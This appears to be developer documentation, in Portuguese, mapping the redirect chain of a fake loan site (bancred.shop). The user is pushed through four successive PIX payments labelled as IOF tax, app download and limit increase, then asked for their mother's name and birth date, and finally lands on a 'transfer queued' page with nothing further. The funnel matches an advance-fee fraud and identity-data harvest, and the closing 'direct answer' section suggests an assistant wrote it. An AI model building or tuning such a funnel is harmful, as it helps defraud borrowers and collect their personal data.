# 🔗 Resumo Completo de Links e Redirecionamentos

## 📍 **PÁGINA FINAL DO FUNIL**

Após **TODOS** os pagamentos, o usuário é redirecionado para:

### **Produção:**
```
https://bancred.shop/conta/saque/iof.html
```

### **Localhost:**
```
http://localhost/[pasta]/conta/saque/iof.html
```

**Extensão:** `.html`  
**Status:** ✅ Página final - não há mais redirecionamentos automáticos

---

## 🔄 **FLUXO COMPLETO DE REDIRECIONAMENTOS**

### **1️⃣ Payment EMP (Primeiro Pagamento)**
```
checkout.html
    ↓ [GERAR PIX]
payment.html?id=[transactionId]
    ↓ [Pagamento Confirmado]
iof2.htm?[trackingParams]
```

**Links:**
- **Produção:** `https://bancred.shop/conta/saque/iof2.htm?[params]`
- **Localhost:** `http://localhost/[pasta]/conta/saque/iof2.htm?[params]`
- **Extensão:** `.htm`

---

### **2️⃣ Payment EMP UP1 (Segundo Pagamento)**
```
iof2.htm
    ↓ [Pagar agora]
payment.html?id=[transactionId]
    ↓ [Pagamento Confirmado]
app-download.htm?[trackingParams]
```

**Links:**
- **Produção:** `https://bancred.shop/conta/app-download.htm?[params]`
- **Localhost:** `http://localhost/[pasta]/conta/app-download.htm?[params]`
- **Extensão:** `.htm`

---

### **3️⃣ Payment EMP UP2 (Terceiro Pagamento)**
```
app-download.htm
    ↓ [Baixar aplicativo]
payment.html?id=[transactionId]
    ↓ [Pagamento Confirmado]
aumento-limite.htm?[trackingParams]
```

**Links:**
- **Produção:** `https://bancred.shop/conta/aumento-limite.htm?[params]`
- **Localhost:** `http://localhost/[pasta]/conta/aumento-limite.htm?[params]`
- **Extensão:** `.htm`

---

### **4️⃣ Payment EMP UP3 (Quarto Pagamento)**
```
aumento-limite.htm
    ↓ [Ativar novo limite]
payment.html?id=[transactionId]
    ↓ [Pagamento Confirmado]
assinatura.htm?[trackingParams]
```

**Links:**
- **Produção:** `https://bancred.shop/conta/assinatura.htm?[params]`
- **Localhost:** `http://localhost/[pasta]/conta/assinatura.htm?[params]`
- **Extensão:** `.htm`

---

### **5️⃣ Payment EMP UP4 (Sem Pagamento - Apenas Validação)**
```
assinatura.htm
    ↓ [Continuar] (SEM pagamento PIX)
confirmacao-dados.htm?[trackingParams]
```

**Links:**
- **Produção:** `https://bancred.shop/conta/confirmacao-dados.htm?[params]`
- **Localhost:** `http://localhost/[pasta]/conta/confirmacao-dados.htm?[params]`
- **Extensão:** `.htm`
- **Observação:** ❌ NÃO tem pagamento PIX, apenas validação de assinatura

---

### **6️⃣ Payment EMP UP5 (Sem Pagamento - Apenas Validação)**
```
confirmacao-dados.htm
    ↓ [Continuar] (SEM pagamento PIX)
iof.html?[trackingParams]
```

**Links:**
- **Produção:** `https://bancred.shop/conta/saque/iof.html?[params]`
- **Localhost:** `http://localhost/[pasta]/conta/saque/iof.html?[params]`
- **Extensão:** `.html`
- **Observação:** ❌ NÃO tem pagamento PIX, apenas validação de dados

---

## 📊 **TABELA RESUMO**

| # | Serviço | Página Atual | Próxima Página | Tem PIX? | Extensão |
|---|---------|--------------|----------------|----------|----------|
| 1 | Payment EMP | `checkout.html` | `iof2.htm` | ✅ Sim | `.htm` |
| 2 | Payment EMP UP1 | `iof2.htm` | `app-download.htm` | ✅ Sim | `.htm` |
| 3 | Payment EMP UP2 | `app-download.htm` | `aumento-limite.htm` | ✅ Sim | `.htm` |
| 4 | Payment EMP UP3 | `aumento-limite.htm` | `assinatura.htm` | ✅ Sim | `.htm` |
| 5 | - | `assinatura.htm` | `confirmacao-dados.htm` | ❌ Não | `.htm` |
| 6 | - | `confirmacao-dados.htm` | `iof.html` | ❌ Não | `.html` |
| 7 | - | `iof.html` | **FINAL** | ❌ Não | `.html` |

---

## 🔗 **TODOS OS LINKS (PRODUÇÃO)**

### **Páginas de Pagamento:**
1. `https://bancred.shop/conta/checkout/pix/payment.html?id=[id]`

### **Páginas de Upsell:**
2. `https://bancred.shop/conta/saque/iof2.htm?[params]`
3. `https://bancred.shop/conta/app-download.htm?[params]`
4. `https://bancred.shop/conta/aumento-limite.htm?[params]`
5. `https://bancred.shop/conta/assinatura.htm?[params]`
6. `https://bancred.shop/conta/confirmacao-dados.htm?[params]`
7. `https://bancred.shop/conta/saque/iof.html?[params]` ⭐ **FINAL**

---

## 🔗 **TODOS OS LINKS (LOCALHOST)**

### **Páginas de Pagamento:**
1. `http://localhost/[pasta]/conta/checkout/pix/payment.html?id=[id]`

### **Páginas de Upsell:**
2. `http://localhost/[pasta]/conta/saque/iof2.htm?[params]`
3. `http://localhost/[pasta]/conta/app-download.htm?[params]`
4. `http://localhost/[pasta]/conta/aumento-limite.htm?[params]`
5. `http://localhost/[pasta]/conta/assinatura.htm?[params]`
6. `http://localhost/[pasta]/conta/confirmacao-dados.htm?[params]`
7. `http://localhost/[pasta]/conta/saque/iof.html?[params]` ⭐ **FINAL**

---

## 📝 **OBSERVAÇÕES IMPORTANTES**

### **1. Extensões:**
- **`.html`:** `payment.html`, `iof.html`
- **`.htm`:** `iof2.htm`, `app-download.htm`, `aumento-limite.htm`, `assinatura.htm`, `confirmacao-dados.htm`

### **2. Parâmetros de Tracking:**
- Todos os redirecionamentos preservam os parâmetros de tracking (UTM, gclid, fbclid, etc.)
- Os parâmetros são salvos no `sessionStorage` antes de entrar em `payment.html`
- Os parâmetros são restaurados após sair de `payment.html`

### **3. Payment.html:**
- **URL Limpa:** `payment.html?id=[transactionId]` (sem tracking params)
- **Motivo:** Evitar conflitos com a API PIX
- **Tracking:** Parâmetros são registrados temporariamente para scripts de tracking

### **4. Páginas Sem Pagamento:**
- `assinatura.htm` → Apenas validação de assinatura digital
- `confirmacao-dados.htm` → Apenas validação de dados (nome da mãe e data de nascimento)

### **5. Página Final:**
- `iof.html` → Última página do funil
- Não há redirecionamento automático
- A página mostra o status da transferência na fila
- Tem botões opcionais para:
  - `index.htm` (página inicial)
  - `conta.html` (página da conta)

---

## 🎯 **RESPOSTA DIRETA**

**Pergunta:** "Qual URL a pessoa é redirecionada após fazer todos os pagamentos?"

**Resposta:** 
```
https://bancred.shop/conta/saque/iof.html
```

**Extensão:** `.html`  
**Status:** ✅ Página final - não há mais redirecionamentos automáticos

